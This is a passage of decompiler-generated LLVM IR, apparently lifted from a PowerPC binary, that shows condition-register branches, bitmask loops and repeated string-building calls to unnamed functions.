  %v4_1000078c = icmp eq i32 %v0_1000078c, %v1_10000784
  store i1 %v2_1000078c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000078c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_1000078c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000078c, label %dec_label_pc_10000794, label %dec_label_pc_10000688

dec_label_pc_10000794:                            ; preds = %dec_label_pc_10000784, %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge
  %v0_100007b4 = phi i32 [ %v0_10000794.pre, %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge ], [ %v0_1000079426, %dec_label_pc_10000784 ]
  %v1_10000794 = icmp slt i32 %v0_100007b4, 0
  %v2_10000794 = icmp sgt i32 %v0_100007b4, 0
  %v3_10000794 = icmp eq i32 %v0_100007b4, 0
  store i1 %v1_10000794, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000794, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000794, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000794, label %dec_label_pc_100005c4, label %dec_label_pc_1000079c

dec_label_pc_1000079c:                            ; preds = %dec_label_pc_10000794
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_100007a4 = load i32, i32* @r1, align 4
  %v1_100007a4 = add i32 %v0_100007a4, 44
  store i32 %v1_100007a4, i32* %r4.global-to-local, align 4
  %v1_100007a8 = add i32 %v0_100007a4, 172
  %v1_100007b0 = add i32 %v0_100007a4, 20
  store i32 %v0_100007b4, i32* %r3.global-to-local, align 4
  %v2_100007b8 = add i32 %v0_100007a4, 24
  %v3_100007b8 = inttoptr i32 %v2_100007b8 to i32*
  store i32 0, i32* %v3_100007b8, align 4
  %v1_100007bc = load i32, i32* @r1, align 4
  %v2_100007bc = add i32 %v1_100007bc, 20
  %v3_100007bc = inttoptr i32 %v2_100007bc to i32*
  store i32 1, i32* %v3_100007bc, align 4
  store i32 268437444, i32* @lr, align 4
  %v6_100007c0 = call i32 @function_10008030(i32 %v0_100007b4, i32 %v1_100007a4, i32 %v1_100007a8, i32 0, i32 %v1_100007b0, i32 1)
  store i32 %v6_100007c0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268437456, i32* @lr, align 4
  %v0_100007cc = call i32 @function_10008138()
  store i32 %v0_100007cc, i32* %r3.global-to-local, align 4
  %v0_100007d0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100007d0 = icmp slt i32 %v0_100007d0, 0
  %v2_100007d0 = icmp sgt i32 %v0_100007d0, 0
  %v3_100007d0 = icmp eq i32 %v0_100007d0, 0
  store i1 %v1_100007d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100007d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100007d0, i1* %cr7_eq.global-to-local, align 1
  %v1_100007d4 = load i32, i32* @r1, align 4
  %v2_100007d4 = add i32 %v1_100007d4, 20792
  %v3_100007d4 = inttoptr i32 %v2_100007d4 to i32*
  store i32 %v0_100007cc, i32* %v3_100007d4, align 4
  %tmp68 = icmp slt i32 %v0_100007d0, 1
  br i1 %tmp68, label %dec_label_pc_100005c4, label %dec_label_pc_100007dc

dec_label_pc_100007dc:                            ; preds = %dec_label_pc_1000079c
  %v0_100007dc = load i32, i32* @r1, align 4
  %v1_100007dc = add i32 %v0_100007dc, 20796
  %v2_100007dc = inttoptr i32 %v1_100007dc to i32*
  %v3_100007dc = load i32, i32* %v2_100007dc, align 4
  store i32 %v3_100007dc, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r19.global-to-local, align 4
  %v1_100007e4 = add i32 %v3_100007dc, 533
  store i32 %v1_100007e4, i32* @r30, align 4
  br label %dec_label_pc_10000838

dec_label_pc_100007ec:                            ; preds = %dec_label_pc_10000844, %dec_label_pc_10000890
  %v0_100007ec = phi i32 [ %v0_10000848, %dec_label_pc_10000844 ], [ %v0_100007ec.pre, %dec_label_pc_10000890 ]
  %v1_100007ec = call i32 @__asm_rlwinm(i32 %v0_100007ec, i32 29, i32 3, i32 29)
  %v0_100007f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100007f0 = urem i32 %v0_100007f0, 32
  store i32 %v1_100007f0, i32* %r11.global-to-local, align 4
  %v1_100007f4 = load i32, i32* %r18.global-to-local, align 4
  %v2_100007f4 = add i32 %v1_100007f4, %v1_100007ec
  store i32 %v2_100007f4, i32* %r9.global-to-local, align 4
  %v1_100007f8 = add i32 %v2_100007f4, 36
  %v2_100007f8 = inttoptr i32 %v1_100007f8 to i32*
  %v3_100007f8 = load i32, i32* %v2_100007f8, align 4
  %v3_100007fc = lshr i32 %v3_100007f8, %v1_100007f0
  store i32 %v3_100007fc, i32* %r0.global-to-local, align 4
  %v1_10000800 = urem i32 %v3_100007fc, 2
  store i32 %v1_10000800, i32* %r9.global-to-local, align 4
  %v3_10000800 = icmp eq i32 %v1_10000800, 0
  br i1 %v3_10000800, label %dec_label_pc_10000824, label %dec_label_pc_10000808

dec_label_pc_10000808:                            ; preds = %dec_label_pc_100007ec
  %v0_10000808 = load i32, i32* @r30, align 4
  %v1_10000808 = add i32 %v0_10000808, -529
  %v2_10000808 = inttoptr i32 %v1_10000808 to i8*
  %v3_10000808 = load i8, i8* %v2_10000808, align 1
  %v4_10000808 = zext i8 %v3_10000808 to i32
  store i32 %v4_10000808, i32* %r0.global-to-local, align 4
  %v1_1000080c = icmp ult i8 %v3_10000808, 6
  %v2_1000080c = icmp ugt i8 %v3_10000808, 6
  %v3_1000080c = icmp eq i8 %v3_10000808, 6
  store i1 %v1_1000080c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000080c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000080c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000080c, label %dec_label_pc_10000ca8, label %dec_label_pc_10000814

dec_label_pc_10000814:                            ; preds = %dec_label_pc_10000808
  %v1_10000814 = icmp ult i8 %v3_10000808, 7
  %v2_10000814 = icmp ugt i8 %v3_10000808, 7
  %v3_10000814 = icmp eq i8 %v3_10000808, 7
  store i1 %v1_10000814, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000814, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000814, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000814, label %dec_label_pc_10001294, label %dec_label_pc_1000081c

dec_label_pc_1000081c:                            ; preds = %dec_label_pc_10000814
  %v1_1000081c = icmp ult i8 %v3_10000808, 10
  %v2_1000081c = icmp ugt i8 %v3_10000808, 10
  %v3_1000081c = icmp eq i8 %v3_10000808, 10
  store i1 %v1_1000081c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000081c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000081c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000081c, label %dec_label_pc_10001518, label %dec_label_pc_10000824

dec_label_pc_10000824:                            ; preds = %dec_label_pc_100017ec, %dec_label_pc_100013b0, %dec_label_pc_1000190c, %dec_label_pc_100017d4, %dec_label_pc_1000081c, %dec_label_pc_100007ec, %dec_label_pc_10000838, %dec_label_pc_10001b70, %dec_label_pc_100019ac, %dec_label_pc_100018f0, %dec_label_pc_100017bc, %dec_label_pc_10001758, %dec_label_pc_10001558, %dec_label_pc_100014f0, %dec_label_pc_10001414, %dec_label_pc_100011e4
  %v0_10000824 = load i32, i32* %r19.global-to-local, align 4
  %v1_10000824 = add i32 %v0_10000824, 1
  store i32 %v1_10000824, i32* %r19.global-to-local, align 4
  %v0_10000828 = load i32, i32* %r23.global-to-local, align 4
  %v1_10000828 = add i32 %v0_10000828, 3140
  store i32 %v1_10000828, i32* %r23.global-to-local, align 4
  %v1_1000082c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000082c = icmp slt i32 %v1_10000824, %v1_1000082c
  %v3_1000082c = icmp sgt i32 %v1_10000824, %v1_1000082c
  %v4_1000082c = icmp eq i32 %v1_10000824, %v1_1000082c
  store i1 %v2_1000082c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000082c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_1000082c, i1* %cr7_eq.global-to-local, align 1
  %v0_10000830 = load i32, i32* @r30, align 4
  %v1_10000830 = add i32 %v0_10000830, 3140
  store i32 %v1_10000830, i32* @r30, align 4
  br i1 %v4_1000082c, label %dec_label_pc_100005c4, label %dec_label_pc_10000838

dec_label_pc_10000838:                            ; preds = %dec_label_pc_10000824, %dec_label_pc_100007dc
  %v0_10000838 = phi i32 [ %v1_10000830, %dec_label_pc_10000824 ], [ %v1_100007e4, %dec_label_pc_100007dc ]
  %v1_10000838 = add i32 %v0_10000838, -533
  %v2_10000838 = inttoptr i32 %v1_10000838 to i32*
  %v3_10000838 = load i32, i32* %v2_10000838, align 4
  store i32 %v3_10000838, i32* %r3.global-to-local, align 4
  %v1_1000083c = icmp slt i32 %v3_10000838, -1
  %v2_1000083c = icmp sgt i32 %v3_10000838, -1
  %v3_1000083c = icmp eq i32 %v3_10000838, -1
  store i1 %v1_1000083c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000083c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000083c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000083c, label %dec_label_pc_10000824, label %dec_label_pc_10000844

dec_label_pc_10000844:                            ; preds = %dec_label_pc_10000838
  %v1_10000844 = call i32 @__asm_rlwinm(i32 %v3_10000838, i32 29, i32 3, i32 29)
  %v0_10000848 = load i32, i32* %r3.global-to-local, align 4
  %v1_10000848 = urem i32 %v0_10000848, 32
  store i32 %v1_10000848, i32* %r11.global-to-local, align 4
  %v1_1000084c = load i32, i32* %r18.global-to-local, align 4
  %v2_1000084c = add i32 %v1_1000084c, %v1_10000844
  store i32 %v2_1000084c, i32* %r9.global-to-local, align 4
  %v1_10000850 = add i32 %v2_1000084c, 164
  %v2_10000850 = inttoptr i32 %v1_10000850 to i32*
  %v3_10000850 = load i32, i32* %v2_10000850, align 4
  %v3_10000854 = lshr i32 %v3_10000850, %v1_10000848
  store i32 %v3_10000854, i32* %r0.global-to-local, align 4
  %v1_10000858 = urem i32 %v3_10000854, 2
  store i32 %v1_10000858, i32* %r9.global-to-local, align 4
  %v3_10000858 = icmp eq i32 %v1_10000858, 0
  br i1 %v3_10000858, label %dec_label_pc_100007ec, label %dec_label_pc_10000860

dec_label_pc_10000860:                            ; preds = %dec_label_pc_10000844
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 4, i32* @r31, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v0_10000870 = load i32, i32* @r1, align 4
  %v1_10000870 = add i32 %v0_10000870, 12
  %v1_10000874 = add i32 %v0_10000870, 16
  %v3_10000878 = inttoptr i32 %v1_10000870 to i32*
  store i32 0, i32* %v3_10000878, align 4
  %v0_1000087c = load i32, i32* @r31, align 4
  %v1_1000087c = load i32, i32* @r1, align 4
  %v2_1000087c = add i32 %v1_1000087c, 16
  %v3_1000087c = inttoptr i32 %v2_1000087c to i32*
  store i32 %v0_1000087c, i32* %v3_1000087c, align 4
  store i32 268437636, i32* @lr, align 4
  %v5_10000880 = call i32 @function_1000899c(i32 1, i32 4, i32 %v1_10000870, i32 %v1_10000874, i32 %v1_10000858)
  store i32 %v5_10000880, i32* %r3.global-to-local, align 4
  %v0_10000884 = load i32, i32* @r1, align 4
  %v1_10000884 = add i32 %v0_10000884, 12
  %v2_10000884 = inttoptr i32 %v1_10000884 to i32*
  %v3_10000884 = load i32, i32* %v2_10000884, align 4
  store i32 %v3_10000884, i32* %r0.global-to-local, align 4
  %v2_10000888 = or i32 %v3_10000884, %v5_10000880
  store i32 %v2_10000888, i32* %r9.global-to-local, align 4
  %v5_10000888 = icmp eq i32 %v2_10000888, 0
  %v0_10000890 = load i32, i32* @r30, align 4
  %v1_10000890 = add i32 %v0_10000890, -533
  %v2_10000890 = inttoptr i32 %v1_10000890 to i32*
  %v3_10000890 = load i32, i32* %v2_10000890, align 4
  store i32 %v3_10000890, i32* %r3.global-to-local, align 4
  br i1 %v5_10000888, label %dec_label_pc_10000890, label %dec_label_pc_100014f0

dec_label_pc_10000890:                            ; preds = %dec_label_pc_10000860
  %v0_10000894 = load i32, i32* @r31, align 4
  %v1_10000894 = trunc i32 %v0_10000894 to i8
  %v3_10000894 = add i32 %v0_10000890, -529
  %v4_10000894 = inttoptr i32 %v3_10000894 to i8*
  store i8 %v1_10000894, i8* %v4_10000894, align 1
  %v0_100007ec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100007ec

dec_label_pc_1000089c:                            ; preds = %dec_label_pc_10000688
  %v1_1000089c = add i32 %v2_10000c8c, 1456
  %v2_1000089c = inttoptr i32 %v1_1000089c to i32*
  %v3_1000089c = load i32, i32* %v2_1000089c, align 4
  store i32 %v3_1000089c, i32* %r0.global-to-local, align 4
  %v1_100008a0 = icmp slt i32 %v3_1000089c, 0
  %v2_100008a0 = icmp sgt i32 %v3_1000089c, 0
  %v3_100008a0 = icmp eq i32 %v3_1000089c, 0
  store i1 %v1_100008a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100008a0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100008a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100008a0, label %dec_label_pc_10000c8c, label %dec_label_pc_100008a8

dec_label_pc_100008a8:                            ; preds = %dec_label_pc_1000089c
  store i32 4, i32* %r0.global-to-local, align 4
  store i8 4, i8* %v2_10000688, align 1
  %v1_100008b4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100008b0

dec_label_pc_100008b0:                            ; preds = %dec_label_pc_10000648, %dec_label_pc_100008a8
  %v1_100008b4 = phi i32 [ %v2_10000c8c, %dec_label_pc_10000648 ], [ %v1_100008b4.pre, %dec_label_pc_100008a8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_100008b4 = load i32, i32* %r19.global-to-local, align 4
  %v2_100008b4 = add i32 %v1_100008b4, 1464
  %v3_100008b4 = inttoptr i32 %v2_100008b4 to i32*
  store i32 %v0_100008b4, i32* %v3_100008b4, align 4
  %v0_100008b8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100008b8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100008b8 = add i32 %v1_100008b8, 1452
  %v3_100008b8 = inttoptr i32 %v2_100008b8 to i32*
  store i32 %v0_100008b8, i32* %v3_100008b8, align 4
  %v0_100008bc = load i32, i32* %r30.global-to-local, align 4
  %v1_100008bc = add i32 %v0_100008bc, 2116
  store i32 %v1_100008bc, i32* @r3, align 4
  store i32 1024, i32* @r4, align 4
  %v1_100008c4 = add i32 %v0_100008bc, 1431
  store i32 %v1_100008c4, i32* %r27.global-to-local, align 4
  store i32 268437708, i32* @lr, align 4
  %v0_100008c8 = call i32 @function_10007584()
  %v0_100008cc = load i32, i32* %r29.global-to-local, align 4
  %v1_100008cc = load i32, i32* %r30.global-to-local, align 4
  %v2_100008cc = add i32 %v1_100008cc, 2112
  %v3_100008cc = inttoptr i32 %v2_100008cc to i32*
  store i32 %v0_100008cc, i32* %v3_100008cc, align 4
  store i32 10240, i32* @r4, align 4
  %v0_100008d4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008d4, i32* @r3, align 4
  store i32 268437724, i32* @lr, align 4
  %v0_100008d8 = call i32 @function_10007584()
  %v0_100008dc = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008dc, i32* %r3.global-to-local, align 4
  store i32 268437732, i32* @lr, align 4
  %v1_100008e0 = inttoptr i32 %v0_100008dc to i8*
  %v2_100008e0 = call i32 @function_100074dc(i8* %v1_100008e0)
  %v0_100008e4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100008e4, i32* %r4.global-to-local, align 4
  %v0_100008e8 = load i32, i32* %r22.global-to-local, align 4
  %v2_100008e8 = add i32 %v0_100008e8, %v2_100008e0
  store i32 %v2_100008e8, i32* @r3, align 4
  store i32 268437744, i32* %lr.global-to-local, align 4
  %v2_100008ec = inttoptr i32 %v2_100008e8 to i8*
  %v3_100008ec = call i32 @function_10007504(i8* %v2_100008ec, i32 %v0_100008e4)
  %v0_100008f0 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100008f0, i32* %r3.global-to-local, align 4
  store i32 268437752, i32* @lr, align 4
  %v1_100008f4 = inttoptr i32 %v0_100008f0 to i8*
  %v2_100008f4 = call i32 @function_100074dc(i8* %v1_100008f4)
  %v0_100008f8 = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_100008f8, i32* %r4.global-to-local, align 4
  %v0_100008fc = load i32, i32* %r22.global-to-local, align 4
  %v2_100008fc = add i32 %v0_100008fc, %v2_100008f4
  store i32 %v2_100008fc, i32* @r3, align 4
  store i32 268437764, i32* %lr.global-to-local, align 4
  %v2_10000900 = inttoptr i32 %v2_100008fc to i8*
  %v3_10000900 = call i32 @function_10007504(i8* %v2_10000900, i32 %v0_100008f8)
  %v0_10000904 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000904, i32* %r3.global-to-local, align 4
  store i32 268437772, i32* @lr, align 4
  %v1_10000908 = inttoptr i32 %v0_10000904 to i8*
  %v2_10000908 = call i32 @function_100074dc(i8* %v1_10000908)
  %v0_1000090c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000090c = add i32 %v0_1000090c, 532
  store i32 %v1_1000090c, i32* %r4.global-to-local, align 4
  %v0_10000910 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000910 = add i32 %v0_10000910, %v2_10000908
  store i32 %v2_10000910, i32* @r3, align 4
  store i32 268437784, i32* %lr.global-to-local, align 4
  %v2_10000914 = inttoptr i32 %v2_10000910 to i8*
  %v3_10000914 = call i32 @function_10007504(i8* %v2_10000914, i32 %v1_1000090c)
  %v0_10000918 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000918, i32* %r3.global-to-local, align 4
  store i32 268437792, i32* @lr, align 4
  %v1_1000091c = inttoptr i32 %v0_10000918 to i8*
  %v2_1000091c = call i32 @function_100074dc(i8* %v1_1000091c)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000a788.26 to i32), i32* %r4.global-to-local, align 4
  %v0_10000928 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000928 = add i32 %v0_10000928, %v2_1000091c
  store i32 %v2_10000928, i32* @r3, align 4
  store i32 268437808, i32* %lr.global-to-local, align 4
  %v3_1000092c = inttoptr i32 %v2_10000928 to i8*
  %v4_1000092c = call i32 @function_10007504(i8* %v3_1000092c, i32 ptrtoint ([24 x i8]* @global_var_1000a788.26 to i32))
  %v0_10000930 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000930, i32* %r3.global-to-local, align 4
  store i32 268437816, i32* @lr, align 4
  %v1_10000934 = inttoptr i32 %v0_10000930 to i8*
  %v2_10000934 = call i32 @function_100074dc(i8* %v1_10000934)
  %v0_10000938 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000938 = add i32 %v0_10000938, 20
  store i32 %v1_10000938, i32* %r4.global-to-local, align 4
  %v0_1000093c = load i32, i32* %r22.global-to-local, align 4
  %v2_1000093c = add i32 %v0_1000093c, %v2_10000934
  store i32 %v2_1000093c, i32* @r3, align 4
  store i32 268437828, i32* %lr.global-to-local, align 4
  %v2_10000940 = inttoptr i32 %v2_1000093c to i8*
  %v3_10000940 = call i32 @function_10007504(i8* %v2_10000940, i32 %v1_10000938)
  %v0_10000944 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000944, i32* %r3.global-to-local, align 4
  store i32 268437836, i32* @lr, align 4
  %v1_10000948 = inttoptr i32 %v0_10000944 to i8*
  %v2_10000948 = call i32 @function_100074dc(i8* %v1_10000948)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000a7a0.27 to i32), i32* %r4.global-to-local, align 4
  %v0_10000954 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000954 = add i32 %v0_10000954, %v2_10000948
  store i32 %v2_10000954, i32* @r3, align 4
  store i32 268437852, i32* %lr.global-to-local, align 4
  %v3_10000958 = inttoptr i32 %v2_10000954 to i8*
  %v4_10000958 = call i32 @function_10007504(i8* %v3_10000958, i32 ptrtoint ([9 x i8]* @global_var_1000a7a0.27 to i32))
  %v0_1000095c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_1000095c, i32* %r3.global-to-local, align 4
  store i32 268437860, i32* @lr, align 4
  %v1_10000960 = inttoptr i32 %v0_1000095c to i8*
  %v2_10000960 = call i32 @function_100074dc(i8* %v1_10000960)
  %v0_10000964 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000964 = add i32 %v0_10000964, 789
  store i32 %v1_10000964, i32* %r4.global-to-local, align 4
  %v0_10000968 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000968 = add i32 %v0_10000968, %v2_10000960
  store i32 %v2_10000968, i32* @r3, align 4
  store i32 268437872, i32* %lr.global-to-local, align 4
  %v2_1000096c = inttoptr i32 %v2_10000968 to i8*
  %v3_1000096c = call i32 @function_10007504(i8* %v2_1000096c, i32 %v1_10000964)
  %v0_10000970 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000970, i32* %r3.global-to-local, align 4
  store i32 268437880, i32* @lr, align 4
  %v1_10000974 = inttoptr i32 %v0_10000970 to i8*
  %v2_10000974 = call i32 @function_100074dc(i8* %v1_10000974)
  %v0_10000978 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000978, i32* %r4.global-to-local, align 4
  %v0_1000097c = load i32, i32* %r22.global-to-local, align 4
  %v2_1000097c = add i32 %v0_1000097c, %v2_10000974
  store i32 %v2_1000097c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000984.28 to i32), i32* %lr.global-to-local, align 4
  %v3_10000980 = inttoptr i32 %v2_1000097c to i8*
  %v4_10000980 = call i32 @function_10007504(i8* %v3_10000980, i32 %v0_10000978)
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437900, i32* @lr, align 4
  %v1_10000988 = call i32 @function_10006c64(i32 32)
  %v0_1000098c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_1000098c, i32* %r3.global-to-local, align 4
  store i32 268437908, i32* @lr, align 4
  %v1_10000990 = inttoptr i32 %v0_1000098c to i8*
  %v2_10000990 = call i32 @function_100074dc(i8* %v1_10000990)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000990, i32* %r29.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437924, i32* %lr.global-to-local, align 4
  %v3_100009a0 = call i32 @function_10006bb0(i32 32, i32* null)
  store i32 %v3_100009a0, i32* %r4.global-to-local, align 4
  %v0_100009a8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100009a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100009a8 = add i32 %v1_100009a8, %v0_100009a8
  store i32 %v2_100009a8, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009b0.29 to i32), i32* %lr.global-to-local, align 4
  %v2_100009ac = inttoptr i32 %v2_100009a8 to i8*
  %v3_100009ac = call i32 @function_10007504(i8* %v2_100009ac, i32 %v3_100009a0)
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 268437944, i32* @lr, align 4
  %v1_100009b4 = call i32 @function_10006bd8(i32 32)
  %v0_100009b8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100009b8, i32* %r3.global-to-local, align 4
  store i32 268437952, i32* @lr, align 4
  %v1_100009bc = inttoptr i32 %v0_100009b8 to i8*
  %v2_100009bc = call i32 @function_100074dc(i8* %v1_100009bc)
  %v0_100009c0 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100009c0, i32* %r4.global-to-local, align 4
  %v0_100009c4 = load i32, i32* %r22.global-to-local, align 4
  %v2_100009c4 = add i32 %v0_100009c4, %v2_100009bc
  store i32 %v2_100009c4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009cc.30 to i32), i32* %lr.global-to-local, align 4
  %v3_100009c8 = inttoptr i32 %v2_100009c4 to i8*
  %v4_100009c8 = call i32 @function_10007504(i8* %v3_100009c8, i32 %v0_100009c0)
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268437972, i32* @lr, align 4
  %v1_100009d0 = call i32 @function_10006c64(i32 33)
  %v0_100009d4 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100009d4, i32* %r3.global-to-local, align 4
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = inttoptr i32 %v0_100009d4 to i8*
  %v2_100009d8 = call i32 @function_100074dc(i8* %v1_100009d8)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_100009d8, i32* %r29.global-to-local, align 4
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268437996, i32* %lr.global-to-local, align 4
  %v3_100009e8 = call i32 @function_10006bb0(i32 33, i32* null)
  store i32 %v3_100009e8, i32* %r4.global-to-local, align 4
  %v0_100009f0 = load i32, i32* %r22.global-to-local, align 4
  %v1_100009f0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100009f0 = add i32 %v1_100009f0, %v0_100009f0
  store i32 %v2_100009f0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100009f8.31 to i32), i32* %lr.global-to-local, align 4
  %v2_100009f4 = inttoptr i32 %v2_100009f0 to i8*
  %v3_100009f4 = call i32 @function_10007504(i8* %v2_100009f4, i32 %v3_100009e8)
  store i32 33, i32* %r3.global-to-local, align 4
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = call i32 @function_10006bd8(i32 33)
  %v0_10000a00 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a00, i32* %r3.global-to-local, align 4
  store i32 268438024, i32* @lr, align 4
  %v1_10000a04 = inttoptr i32 %v0_10000a00 to i8*
  %v2_10000a04 = call i32 @function_100074dc(i8* %v1_10000a04)
  %v0_10000a08 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a08, i32* %r4.global-to-local, align 4
  %v0_10000a0c = load i32, i32* %r22.global-to-local, align 4
  %v2_10000a0c = add i32 %v0_10000a0c, %v2_10000a04
  store i32 %v2_10000a0c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a14.32 to i32), i32* %lr.global-to-local, align 4
  %v3_10000a10 = inttoptr i32 %v2_10000a0c to i8*
  %v4_10000a10 = call i32 @function_10007504(i8* %v3_10000a10, i32 %v0_10000a08)
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438044, i32* @lr, align 4
  %v1_10000a18 = call i32 @function_10006c64(i32 34)
  %v0_10000a1c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a1c, i32* %r3.global-to-local, align 4
  store i32 268438052, i32* @lr, align 4
  %v1_10000a20 = inttoptr i32 %v0_10000a1c to i8*
  %v2_10000a20 = call i32 @function_100074dc(i8* %v1_10000a20)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a20, i32* %r29.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438068, i32* %lr.global-to-local, align 4
  %v3_10000a30 = call i32 @function_10006bb0(i32 34, i32* null)
  store i32 %v3_10000a30, i32* %r4.global-to-local, align 4
  %v0_10000a38 = load i32, i32* %r22.global-to-local, align 4
  %v1_10000a38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000a38 = add i32 %v1_10000a38, %v0_10000a38
  store i32 %v2_10000a38, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000a40.33 to i32), i32* %lr.global-to-local, align 4
  %v2_10000a3c = inttoptr i32 %v2_10000a38 to i8*
  %v3_10000a3c = call i32 @function_10007504(i8* %v2_10000a3c, i32 %v3_10000a30)
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 268438088, i32* @lr, align 4
  %v1_10000a44 = call i32 @function_10006bd8(i32 34)
  %v0_10000a48 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a48, i32* %r3.global-to-local, align 4
  store i32 268438096, i32* @lr, align 4
  %v1_10000a4c = inttoptr i32 %v0_10000a48 to i8*
  %v2_10000a4c = call i32 @function_100074dc(i8* %v1_10000a4c)
  %v0_10000a50 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000a50, i32* %r4.global-to-local, align 4
  %v0_10000a54 = load i32, i32* %r22.global-to-local, align 4
  %v2_10000a54 = add i32 %v0_10000a54, %v2_10000a4c
  store i32 %v2_10000a54, i32* @r3, align 4
  store i32 268438108, i32* %lr.global-to-local, align 4
  %v3_10000a58 = inttoptr i32 %v2_10000a54 to i8*
  %v4_10000a58 = call i32 @function_10007504(i8* %v3_10000a58, i32 %v0_10000a50)
  store i32 %v4_10000a58, i32* %r3.global-to-local, align 4
  %v0_10000a5c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10000a5c, label %dec_label_pc_10000b18, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_100008b0
  store i32 35, i32* %r3.global-to-local, align 4
  store i32 268438120, i32* @lr, align 4
  %v1_10000a64 = call i32 @function_10006c64(i32 35)
  %v0_10000a68 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10000a68, i32* %r3.global-to-local, align 4
  store i32 268438128, i32* @lr, align 4
  %v1_10000a6c = inttoptr i32 %v0_10000a68 to i8*
